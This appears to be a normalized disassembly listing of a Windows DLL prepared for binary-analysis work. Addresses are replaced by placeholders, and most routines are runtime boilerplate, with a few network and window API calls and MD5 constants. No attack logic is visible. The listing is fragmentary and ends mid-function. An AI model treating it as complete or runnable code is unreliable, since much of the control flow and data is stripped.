test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_10012559
push esi
call sub_100242e6
pop ecx
sub_100125ed
push [ ebp + 0x8 ]
call sub_1001258e
pop ecx
push 0x0
push 0x0
call sub_10027dd1
int3
sub_10012625
push esi
mov esi ecx
call sub_10003efc
and [ esi + 0x1c ] 0x0
and [ esi + 0x20 ] 0x0
mov eax esi
pop esi
retn
sub_10012639
push 0x0
push 0x1
call sub_10001500
retn
sub_10012746
push esi
mov esi ecx
call sub_10012762
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1001298a
mov [ ecx ] r--data
retn
sub_10012991
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10012a65
push esi
mov esi ecx
call sub_10012a81
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10012ceb
mov [ ebp - 0x4 ] 0x2
mov eax sub_10012cf8
retn
sub_10012d3d
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
mov [ esi ] r--data
call sub_10012ed9
add esi 0x4
call sub_10001574
push [ esi ]
call sub_100242e6
pop ecx
pop esi
retn
sub_10012de5
push esi
mov esi ecx
call sub_10012d3d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10013a74
push esi
mov esi ecx
call sub_10013a90
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10013d89
mov eax r-xdata
retn
sub_10013f4e
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1001400f
push esi
mov esi ecx
call sub_1001402b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10014856
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
retn
inc eax
inc eax
dec [ esp + 0xc ]
jne r-xdata
mov cx [ eax ]
cmp cx [ esp + 0x8 ]
je r-xdata
sub_10014c18
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_10014da3
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001b7b
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10014dbb
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001b5e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10014fe2
push 0x0
push [ esp + 0x8 ]
lea ecx [ esi + 0x4 ]
call sub_100079fe
mov [ esi ] r--data
mov eax esi
retn 0x4
sub_10014ffb
push esi
mov esi ecx
call sub_10015032
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10015017
push [ esp + 0x8 ]
lea ecx [ esi + 0x4 ]
push [ esp + 0x8 ]
call sub_100026d3
mov [ esi ] r--data
mov eax esi
retn 0x8
sub_10015032
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_10002020
retn
sub_10015159
push esi
mov esi ecx
call sub_10015175
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10015514
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10001500
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
retn
jmp sub_10003d5c
sub_10015541
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0xc
push eax
call sub_1000136c
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100156c0
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10015720
mov [ ecx ] r--data
retn
sub_10015bc1
push esi
mov esi ecx
call sub_10015bdd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10015c04
mov eax r-xdata
retn
sub_10015c51
xor eax eax
inc eax
retn
sub_10015c55
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x2
pop eax
sub_10015c62
call sub_1002ca7d
retn 0x4
sub_10015c6a
push esi
mov esi ecx
mov eax [ esi ]
mov [ esi + 0xd ] 0x1
call [ eax + 0xc ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] 0x1
mov eax [ esi + 0x10 ]
pop esi
retn
sub_10016427
push esi
mov esi ecx
call sub_10016443
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10016545
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10016c71
push esi
mov esi ecx
call sub_10016c8d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10016dd8
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100170c3
mov [ ecx ] r--data
jmp sub_10001b5e
sub_10017924
xor eax eax
cmp [ esp + 0x8 ] eax
je r-xdata
retn
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
call sub_100085ae
sub_10017b47
push ecx
and [ esp ] 0x0
push ebx
mov ebx eax
push 0x1a
call sub_100179c4
pop ecx
mov eax ebx
pop ebx
pop ecx
retn
sub_10017b5c
push ecx
and [ esp ] 0x0
push ebx
mov ebx eax
push 0x23
call sub_100179c4
pop ecx
mov eax ebx
pop ebx
pop ecx
retn
sub_10017d59
push esi
mov esi ecx
call sub_10017d75
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10018462
push esi
mov esi ecx
call sub_1001847e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100184ea
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100188a2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1001857f
mov [ ecx ] r--data
jmp sub_100188a2
sub_1001858a
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100188a2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100185ac
mov [ ecx ] r--data
jmp sub_100188a2
sub_10018635
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100188a2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10018657
mov [ ecx ] r--data
jmp sub_100188a2
sub_10018886
push esi
mov esi ecx
call sub_100188a2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100188a2
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
sub_100188bf
push r--data
mov ecx esi
call sub_10010da6
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
retn
lea eax [ esi + 0x4 ]
retn
mov eax [ esi + 0x4 ]
retn
CoUninitialize
jmp [ CoUninitialize@IAT ]
sub_10018be1
and [ eax + 0x14 ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_10019a8b
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
add eax 0x4
add ecx 0x4
dec [ esp + 0x4 ]
jne r-xdata
sub_10019aa3
dec eax
inc eax
retn
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
sub_1001bf54
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_100272fd
pop ecx
retn
sub_1001bf65
cmp [ esp + 0x8 ] 0x0
je r-xdata
retn
push [ esp + 0x8 ]
call sub_10024aba
pop ecx
sub_100228d1
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100228ee
mov [ ecx ] r--data
retn
sub_10022bfd
push esi
mov esi ecx
call sub_10022c19
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10022c19
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov ecx esi
pop esi
jmp sub_10015bdd
push eax
call [ DestroyWindow@IAT ]
sub_10022f17
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001675f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10022f39
mov [ ecx ] r--data
jmp sub_1001675f
sub_100230e4
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_1002427c
pop ecx
sub_10023115
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_1002425c
push [ esi ]
call sub_100242e6
pop ecx
pop ecx
pop esi
retn
sub_1002312c
push [ ecx ]
call sub_1002426c
pop ecx
retn
sub_10023135
push [ ecx ]
call sub_1002427c
pop ecx
retn
sub_1002313e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10028434
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_1002844b
sub_10023158
mov ecx [ ecx + 0x4 ]
call sub_10003c0e
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_100231db
mov eax [ rw-data ]
retn
sub_10023577
mov edi edi
push esi
call sub_10029ba7
mov esi [ eax + 0x8 ]
call sub_10029b5b
mov edx eax
mov eax esi
pop esi
retn
sub_10023817
push r-xdata
call sub_10028434
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
j_sub_1002a680
jmp sub_1002a680
sub_1002406c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10024003
sub_10024077
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10024389
sub_1002424c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1002425c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_1002426c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_1002427c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100242b2
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ rw-data ] eax
test ecx ecx
je r-xdata
retn
cmp eax 0xa
jb r-xdata
call [ eax * 4 + rw-data ]
sub_100242e6
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10024aba
sub_1002436e
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_10024452
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_100243ee
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_10024452
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100244cc
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_10024aba
pop ecx
sub_100244e2
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1002450d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1002446f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002452a
mov [ ecx ] r--data
jmp sub_100244cc
sub_1002457d
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1002b6c8
pop ecx
retn
sub_100246d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10024a4a
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1002ca15
pop ecx
pop ecx
retn
sub_10024b10
push 0x4
call sub_1002d0d6
pop ecx
retn
sub_10024b48
mov edi edi
push ebp
mov ebp esp
call sub_1002bd74
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10024b5a
call sub_1002bd74
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_10024c18
call sub_1002bd74
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10028858
sub_10024e45
push esi
call sub_10027511
pop ecx
retn
sub_10025027
push [ ebp + 0x14 ]
call sub_10027511
pop ecx
retn
sub_1002518a
push [ ebp + 0xc ]
call sub_10027511
pop ecx
retn
sub_10025290
push esi
call sub_10027511
pop ecx
retn
sub_1002539d
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_1002554e
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_100256aa
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1002754d
pop ecx
pop ecx
retn
sub_100256d9
push 0x1
call sub_1002d0d6
pop ecx
retn
sub_1002572b
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_10025735
push 0x1
call sub_10025608
pop ecx
retn
sub_10025829
push esi
call sub_10027511
pop ecx
retn
sub_100272f4
push 0x4
call sub_1002d0d6
pop ecx
retn
sub_1002747e
call sub_10025735
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10024aba
pop ecx
retn
call sub_100302fa
sub_1002768e
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_10027b2c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10027b01
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_10027b44
push 0x8
call sub_1002d1b0
pop ecx
retn
sub_10027b4d
push 0x8
call sub_1002d0d6
pop ecx
retn
sub_10027d33
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1002d0d6
pop ecx
sub_10027d48
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10027c1c
add esp 0xc
pop ebp
retn
sub_10027d5e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10027c1c
add esp 0xc
pop ebp
retn
sub_10027d74
push 0x1
push 0x0
push 0x0
call sub_10027c1c
add esp 0xc
retn
sub_100282db
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100282ef
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_100242d7
jmp sub_100282db
sub_100282fe
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_100242d7
jmp sub_100282db
sub_1002842e
call sub_10027b4d
retn
sub_10028434
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_100283f8
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100288c2
push 0xc
call sub_1002d0d6
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_100289ce
push 0xd
call sub_1002d0d6
pop ecx
retn
sub_100289da
push 0xc
call sub_1002d0d6
pop ecx
retn
sub_100296a7
push 0xc
call sub_1002d0d6
pop ecx
retn
sub_100296b3
push 0xc
call sub_1002d0d6
pop ecx
retn
sub_100296e4
and [ esi + 0x70 ] 0xffffffef
retn
sub_10029b16
call sub_1002bd74
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10028858
sub_10029b3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10029b16
sub_10029b5b
call sub_1002bd74
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10028858
sub_10029ba7
call sub_1002bd74
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10028858
sub_10029fd7
call sub_1002bd74
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10028858
sub_1002a402
mov [ ecx ] r--data
jmp sub_100244cc
sub_1002a55e
push [ ebp - 0x14 ]
call sub_1002a493
pop ecx
retn
sub_1002a5a2
call sub_1002bd74
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1002bd74
add eax 0x90
dec [ eax ]
sub_1002a645
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1002a64e
mov esp [ ebp - 0x18 ]
call sub_100316cd
sub_1002a680
call sub_1002bd74
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne cl
mov al cl
retn
sub_1002a70e
push 0x4
mov eax sub_1004b7c0
call sub_10028236
call sub_1002bd74
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10031706
call sub_10031719
sub_1002a7e7
mov eax [ ebp - 0x14 ]
call sub_1002a5bd
retn
sub_1002aa5e
xor eax eax
inc eax
retn
sub_1002aa62
mov esp [ ebp - 0x18 ]
call sub_100316cd
sub_1002aaf7
xor eax eax
inc eax
retn
sub_1002aafb
mov esp [ ebp - 0x18 ]
call sub_100316cd
sub_1002afad
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1002446f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002b2a4
mov eax sub_100353fa
mov [ rw-data ] eax
mov [ rw-data ] sub_10034ae1
mov [ rw-data ] sub_10034a95
mov [ rw-data ] sub_10034ace
mov [ rw-data ] sub_10034a37
mov [ rw-data ] eax
mov [ rw-data ] sub_10035372
mov [ rw-data ] sub_10034a53
mov [ rw-data ] sub_100349b5
mov [ rw-data ] sub_10034942
retn
sub_1002b304
mov edi edi
push ebp
mov ebp esp
call sub_1002b2a4
call sub_10035486
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_1003541d
sub_1002b446
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002b327
add esp 0xc
pop ebp
retn
sub_1002b519
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_1002b629
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002b72f
push 0xe
call sub_1002d0d6
pop ecx
retn
sub_1002baa5
and [ rw-data ] 0x0
retn
sub_1002bb1f
push 0x0
call sub_1002baad
pop ecx
retn
sub_1002bb9a
call [ TlsAlloc@IAT ]
retn 0x4
sub_1002bce9
push 0xd
call sub_1002d0d6
pop ecx
retn
sub_1002bcf2
push 0xc
call sub_1002d0d6
pop ecx
retn
sub_1002bea8
push 0xd
call sub_1002d0d6
pop ecx
retn
sub_1002beb4
push 0xc
call sub_1002d0d6
pop ecx
retn
sub_1002c2f6
xor eax eax
inc eax
retn
sub_1002ca7d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1002d025
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002d0d6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1002d1a7
push 0xa
call sub_1002d0d6
pop ecx
retn
sub_1002dd8d
push 0xc
push r--data
call sub_1002ca38
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_1002ddaa
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1002de3f
call sub_1002dddd
mov [ rw-data ] eax
xor eax eax
retn
sub_1002f579
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_1002f83e
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_1002fd71
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_1002fe5c
push [ ebp + 0x8 ]
call sub_10027511
pop ecx
retn
sub_1002ff6e
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_100300d7
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_10030390
push 0x1
call sub_1002d0d6
pop ecx
retn
sub_100304c8
push 0x1
call sub_1002d0d6
pop ecx
retn
sub_100305aa
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_100304d4
add esp 0xc
pop ebp
retn 0x4
sub_100305dd
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10037271
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10030610
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_100304d4
add esp 0xc
pop ebp
retn 0x8
sub_10030cdc
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_10031077
push 0xd
call sub_1002d0d6
pop ecx
retn
sub_10031442
push 0xd
call sub_1002d0d6
pop ecx
retn
sub_1003147b
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_100312e1
pop ecx
mov [ rw-data ] 0x1
sub_1003169b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_100316cd
push 0x8
push r--data
call sub_1002ca38
call sub_1002bd74
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1002844b
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100316ed
xor eax eax
inc eax
retn
sub_10031706
call sub_1002bd74
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_100316cd
call eax
sub_1003173d
xor eax eax
inc eax
retn
sub_10031751
push sub_100316cd
call sub_1002baad
pop ecx
mov [ rw-data ] eax
retn
sub_10031762
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_100317b7
push [ rw-data ]
call sub_1002bb28
pop ecx
retn
sub_10031938
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1002d0d6
pop ecx
sub_10031974
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10031983
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100319b3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_100319ca
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
push 0x8
call [ SetLastError@IAT ]
sub_10031ae6
push 0x4
call sub_1002d0d6
pop ecx
retn
sub_1003277b
push 0x0
call sub_1003267b
pop ecx
retn
sub_10032884
push 0x0
call sub_10032784
pop ecx
retn
sub_10032be4
push 0x0
call sub_1003288d
pop ecx
retn
sub_10034486
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10036d50
sub_10034598
push 0x4
call sub_1002d0d6
pop ecx
retn
sub_100346fe
push 0x4
call sub_1002d0d6
pop ecx
retn
sub_100348e5
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1003492f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100348f7
pop ecx
pop ecx
pop ebp
retn
sub_10034a95
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10034a53
add esp 0x10
pop ebp
retn
sub_10034ace
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10034942
pop ecx
pop ecx
pop ebp
retn
sub_10034ae1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100349b5
pop ecx
pop ecx
pop ebp
retn
sub_1003585e
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1003580b
add esp 0x10
pop ebp
retn
sub_10035d6e
push [ ebp + 0x8 ]
call sub_10036f99
pop ecx
retn
sub_10035ddc
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10036d27
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10036c10
add esp 0x10
pop ebp
retn
sub_10036f90
push 0xa
call sub_1002d0d6
pop ecx
retn
sub_10037093
push 0xa
call sub_1002d0d6
pop ecx
retn
sub_10037151
push 0xb
call sub_1002d0d6
pop ecx
retn
sub_10037245
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1003717c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10037290
call eax
retn
sub_10037293
push 0x2
call sub_10027ad8
pop ecx
retn
sub_10037347
mov eax rw-data
retn
sub_1003734d
mov eax rw-data
retn
sub_10037353
mov eax rw-data
retn
sub_10037359
mov eax rw-data
retn
sub_1003735f
mov edi edi
push ebp
mov ebp esp
call sub_10037347
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_10037370
mov edi edi
push ebp
mov ebp esp
call sub_1003734d
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_10037381
mov edi edi
push ebp
mov ebp esp
call sub_10037353
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_1003763e
push 0x7
call sub_1002d0d6
pop ecx
retn
sub_1003771e
push 0x6
call sub_1002d0d6
pop ecx
retn
sub_10037887
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10039cfd
add esp 0xc
pop ebp
retn
sub_10039d28
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
